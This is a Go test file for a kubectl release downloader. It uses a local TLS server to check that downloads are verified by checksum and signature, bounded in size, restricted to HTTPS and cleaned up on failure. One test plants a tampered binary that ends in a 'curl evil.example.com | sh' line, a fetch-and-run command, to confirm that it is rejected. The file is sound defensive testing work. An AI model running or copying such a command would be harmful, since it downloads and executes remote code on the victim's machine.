package kubectl

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"testing"
)

// releaseServer serves kubectl releases under /release as dl.k8s.io lays them out, signed by a
// test certificate authority. No test reaches the internet.
type releaseServer struct {
	*httptest.Server
	ca *testCA

	mu    sync.Mutex
	files map[string][]byte // path → body
	asked []string          // paths requested, in order
	// chunked serves the binary without a Content-Length.
	chunked bool
}

func newReleaseServer(t *testing.T) *releaseServer {
	t.Helper()
	rs := &releaseServer{ca: newTestCA(t), files: map[string][]byte{}}
	rs.Server = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		rs.mu.Lock()
		rs.asked = append(rs.asked, r.URL.Path)
		body, ok := rs.files[r.URL.Path]
		chunked := rs.chunked
		rs.mu.Unlock()
		if !ok {
			http.NotFound(w, r)
			return
		}
		if chunked && strings.HasSuffix(r.URL.Path, "/kubectl") {
			w.(http.Flusher).Flush() // no Content-Length
		} else {
			w.Header().Set("Content-Length", strconv.Itoa(len(body)))
		}
		_, _ = w.Write(body)
	}))
	t.Cleanup(rs.Close)
	return rs
}

// publish puts a release on the server: the binary, its SHA-256, and a signature over that
// digest made with a certificate of opts. It returns the binary's directory path on the server.
func (rs *releaseServer) publish(t *testing.T, version, goos, goarch string, binary []byte, opts leafOpts) string {
	t.Helper()
	dir := "/release/v" + version + "/bin/" + goos + "/" + goarch + "/"
	sum := sha256.Sum256(binary)
	cert, key := rs.ca.leaf(t, opts)
	rs.mu.Lock()
	defer rs.mu.Unlock()
	rs.files[dir+"kubectl"] = binary
	rs.files[dir+"kubectl.sha256"] = []byte(hex.EncodeToString(sum[:]))
	rs.files[dir+"kubectl.sig"] = sigFile(t, key, sum[:])
	rs.files[dir+"kubectl.cert"] = cert
	return dir
}

func (rs *releaseServer) set(path string, body []byte) {
	rs.mu.Lock()
	defer rs.mu.Unlock()
	if body == nil {
		delete(rs.files, path)
		return
	}
	rs.files[path] = body
}

func (rs *releaseServer) requests() []string {
	rs.mu.Lock()
	defer rs.mu.Unlock()
	return append([]string(nil), rs.asked...)
}

func (rs *releaseServer) downloader(t *testing.T) *Downloader {
	return &Downloader{Mirror: rs.URL + "/release", Client: rs.Client(), Verifier: rs.ca.verifier(t), GOOS: "linux", GOARCH: "arm64"}
}

// leftovers lists what a download left in dir.
func leftovers(t *testing.T, dir string) []string {
	t.Helper()
	var out []string
	_ = filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
		if err == nil && !d.IsDir() {
			rel, _ := filepath.Rel(dir, path)
			out = append(out, rel)
		}
		return nil
	})
	return out
}

// TestDownloadVerifiesAndInstalls downloads a fake kubectl (a shell script), verified against its
// SHA-256 and signature, into <dir>/<version>/kubectl, executable, and runs it.
func TestDownloadVerifiesAndInstalls(t *testing.T) {
	rs := newReleaseServer(t)
	binary := []byte(fakeKubectl("v1.36.1") + "# " + strings.Repeat("x", 3<<20) + "\n") // > 3 MiB: progress
	rs.publish(t, "1.36.1", "linux", "arm64", binary, leafOpts{})
	dir := filepath.Join(t.TempDir(), "Cogpit", "kubectl")
	var reports [][2]int64
	path, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, dir, func(done, total int64) {
		reports = append(reports, [2]int64{done, total})
	})
	if err != nil {
		t.Fatalf("Download: %v", err)
	}
	if path != filepath.Join(dir, "1.36.1", "kubectl") {
		t.Errorf("path %s", path)
	}
	got, err := os.ReadFile(path)
	if err != nil || string(got) != string(binary) {
		t.Fatalf("the installed file differs (%v)", err)
	}
	fi, _ := os.Stat(path)
	if fi.Mode().Perm() != 0o755 {
		t.Errorf("mode %o, want 755", fi.Mode().Perm())
	}
	for _, d := range []string{dir, filepath.Dir(path)} {
		if fi, _ := os.Stat(d); fi.Mode().Perm() != 0o700 {
			t.Errorf("%s mode %o, want 700", d, fi.Mode().Perm())
		}
	}
	if l := leftovers(t, dir); len(l) != 1 {
		t.Errorf("left %v", l)
	}
	if len(reports) < 3 || reports[len(reports)-1] != [2]int64{int64(len(binary)), int64(len(binary))} {
		t.Errorf("progress %v", reports)
	}
	// The small files first, the binary last, only after the signature verified.
	want := []string{"kubectl.sha256", "kubectl.sig", "kubectl.cert", "kubectl"}
	var asked []string
	for _, p := range rs.requests() {
		asked = append(asked, filepath.Base(p))
	}
	if strings.Join(asked, " ") != strings.Join(want, " ") {
		t.Errorf("requests %v, want %v", asked, want)
	}
	if runtime.GOOS != "windows" {
		if v, err := NewProber().ClientVersion(context.Background(), path); err != nil || v != (Version{1, 36, 1}) {
			t.Errorf("the downloaded kubectl answers %v, %v", v, err)
		}
	}
	if in := Installed(dir, "linux"); len(in) != 1 || in[0].Path != path {
		t.Errorf("installed %+v", in)
	}
}

// TestDownloadRefusesTamperedBinary: a binary that is not the one the release signed is refused
// and nothing is left behind.
func TestDownloadRefusesTamperedBinary(t *testing.T) {
	rs := newReleaseServer(t)
	at := rs.publish(t, "1.36.1", "linux", "arm64", []byte(fakeKubectl("v1.36.1")), leafOpts{})
	rs.set(at+"kubectl", []byte(fakeKubectl("v1.36.1")+"curl evil.example.com | sh\n"))
	dir := t.TempDir()
	_, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, dir, nil)
	if !errors.Is(err, ErrChecksum) {
		t.Fatalf("a tampered binary: %v, want ErrChecksum", err)
	}
	if l := leftovers(t, dir); len(l) != 0 {
		t.Errorf("left %v", l)
	}
}

// TestDownloadRefusesBadSignatures: a .sha256 that matches a swapped binary does not help when the
// signature is not the release's; the binary is never asked for.
func TestDownloadRefusesBadSignatures(t *testing.T) {
	for name, change := range map[string]func(t *testing.T, rs *releaseServer, at string){
		"a digest the release did not sign": func(_ *testing.T, rs *releaseServer, at string) {
			evil := []byte("#!/bin/sh\necho evil\n")
			sum := sha256.Sum256(evil)
			rs.set(at+"kubectl", evil)
			rs.set(at+"kubectl.sha256", []byte(hex.EncodeToString(sum[:])+"  kubectl\n"))
		},
		"another identity's certificate": func(t *testing.T, rs *releaseServer, at string) {
			rs.publish(t, "1.36.1", "linux", "arm64", []byte(fakeKubectl("v1.36.1")), leafOpts{identity: "mallory@example.com"})
		},
		"another authority's certificate": func(t *testing.T, rs *releaseServer, at string) {
			other := newTestCA(t)
			binary := []byte(fakeKubectl("v1.36.1"))
			sum := sha256.Sum256(binary)
			cert, key := other.leaf(t, leafOpts{})
			rs.set(at+"kubectl.cert", cert)
			rs.set(at+"kubectl.sig", sigFile(t, key, sum[:]))
		},
		"no signature": func(_ *testing.T, rs *releaseServer, at string) { rs.set(at+"kubectl.sig", nil) },
		"no certificate": func(_ *testing.T, rs *releaseServer, at string) {
			rs.set(at+"kubectl.cert", nil)
		},
		"no checksum": func(_ *testing.T, rs *releaseServer, at string) { rs.set(at+"kubectl.sha256", nil) },
		"a checksum file without a digest": func(_ *testing.T, rs *releaseServer, at string) {
			rs.set(at+"kubectl.sha256", []byte("<html>not found</html>"))
		},
	} {
		t.Run(name, func(t *testing.T) {
			rs := newReleaseServer(t)
			at := rs.publish(t, "1.36.1", "linux", "arm64", []byte(fakeKubectl("v1.36.1")), leafOpts{})
			change(t, rs, at)
			dir := t.TempDir()
			_, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, dir, nil)
			if err == nil {
				t.Fatal("downloaded")
			}
			for _, p := range rs.requests() {
				if strings.HasSuffix(p, "/kubectl") {
					t.Errorf("the binary was asked for: %v", rs.requests())
				}
			}
			if l := leftovers(t, dir); len(l) != 0 {
				t.Errorf("left %v", l)
			}
		})
	}
}

// TestDownloadSizeBound: a binary larger than the bound is refused, with and without a
// Content-Length.
func TestDownloadSizeBound(t *testing.T) {
	for _, chunked := range []bool{false, true} {
		rs := newReleaseServer(t)
		rs.chunked = chunked
		rs.publish(t, "1.36.1", "linux", "arm64", []byte(strings.Repeat("k", 4096)), leafOpts{})
		d := rs.downloader(t)
		d.MaxSize = 4095
		dir := t.TempDir()
		if _, err := d.Download(context.Background(), Version{1, 36, 1}, dir, nil); err == nil || !strings.Contains(err.Error(), "4095") {
			t.Errorf("chunked %v: %v, want the bound refused", chunked, err)
		}
		if l := leftovers(t, dir); len(l) != 0 {
			t.Errorf("chunked %v: left %v", chunked, l)
		}
		d.MaxSize = 4096
		if _, err := d.Download(context.Background(), Version{1, 36, 1}, dir, nil); err != nil {
			t.Errorf("chunked %v: at the bound: %v", chunked, err)
		}
	}
	// The small files are bounded too.
	rs := newReleaseServer(t)
	at := rs.publish(t, "1.36.1", "linux", "arm64", []byte("k"), leafOpts{})
	rs.set(at+"kubectl.cert", []byte(strings.Repeat("A", maxSmallFile+1)))
	if _, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, t.TempDir(), nil); err == nil {
		t.Error("an oversized .cert was read")
	}
}

// TestDownloadHTTPSOnly: no plain-http mirror, and no redirect away from https.
func TestDownloadHTTPSOnly(t *testing.T) {
	plain := httptest.NewServer(http.NotFoundHandler())
	defer plain.Close()
	rs := newReleaseServer(t)
	rs.Config.Handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, plain.URL+r.URL.Path, http.StatusFound)
	})
	_, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, t.TempDir(), nil)
	if err == nil || !strings.Contains(err.Error(), "not https") {
		t.Errorf("a redirect to http: %v", err)
	}
	d := &Downloader{Mirror: plain.URL + "/release"}
	if _, err := d.Download(context.Background(), Version{1, 36, 1}, t.TempDir(), nil); err == nil || !strings.Contains(err.Error(), "https") {
		t.Errorf("an http mirror: %v", err)
	}
	if _, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, "relative/dir", nil); err == nil {
		t.Error("a relative directory")
	}
}

// TestDownloadMissingRelease: a release the mirror does not have says so.
func TestDownloadMissingRelease(t *testing.T) {
	rs := newReleaseServer(t)
	_, err := rs.downloader(t).Download(context.Background(), Version{1, 99, 0}, t.TempDir(), nil)
	if err == nil || !strings.Contains(err.Error(), "404") || !strings.Contains(err.Error(), "/v1.99.0/bin/linux/arm64/kubectl") {
		t.Errorf("a missing release: %v", err)
	}
	u, _ := (&Downloader{GOOS: "windows", GOARCH: "amd64"}).URL(Version{1, 36, 1})
	if u != "https://dl.k8s.io/release/v1.36.1/bin/windows/amd64/kubectl.exe" {
		t.Errorf("URL %s", u)
	}
}
